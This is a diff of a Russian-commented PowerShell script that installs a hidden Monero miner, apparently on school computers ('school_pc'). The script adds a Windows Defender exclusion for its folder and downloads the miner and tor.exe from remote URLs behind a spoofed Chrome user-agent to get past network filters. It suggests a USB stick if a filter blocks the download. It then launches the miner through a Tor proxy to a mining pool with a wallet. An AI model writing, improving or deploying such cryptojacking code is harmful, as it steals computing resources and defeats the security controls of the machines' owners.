@@ -34,12 +34,20 @@ Stop-Process -Name "tor" -Force -ErrorAction SilentlyContinue
 if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
 Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
 
-# 4. Загрузка компонентов
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+# 4. # 4. Загрузка компонентов с маскировкой под браузер
+$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 try {
-    if (!(Test-Path "$path\$procName.exe")) { Invoke-WebRequest -Uri $exeUrl -OutFile "$path\$procName.exe" }
-    if (!(Test-Path "$path\tor.exe")) { Invoke-WebRequest -Uri $torUrl -OutFile "$path\tor.exe" }
-} catch { Write-Host "Ошибка сети!"; exit }
+    if (!(Test-Path "$path\$procName.exe")) { 
+        Invoke-WebRequest -Uri $exeUrl -OutFile "$path\$procName.exe" -UserAgent $userAgent -ErrorAction Stop
+    }
+    if (!(Test-Path "$path\tor.exe")) { 
+        Invoke-WebRequest -Uri $torUrl -OutFile "$path\tor.exe" -UserAgent $userAgent -ErrorAction Stop
+    }
+    Write-Host "[OK] Компоненты загружены через маскировку." -ForegroundColor Green
+} catch {
+    Write-Host "[!] Фильтр блокирует загрузку. Используй флешку!" -ForegroundColor Red; exit
+}
+
 
 # 5. Файлы запуска (Tor Tunnel + Miner)
 $cmd = "@echo off`nstart /b $path\tor.exe --SocksPort 9050 --Quiet`ntimeout /t 15 /nobreak >nul`n$path\$procName.exe --title $procName --cpu-priority 1 --cpu-no-yield --cpu-max-threads-hint 50 -o gulf.moneroocean.stream:443 -u $wallet -p school_pc --algo rx/0 --donate-level 1 --tls --proxy=socks5://127.0.0.1:9050"
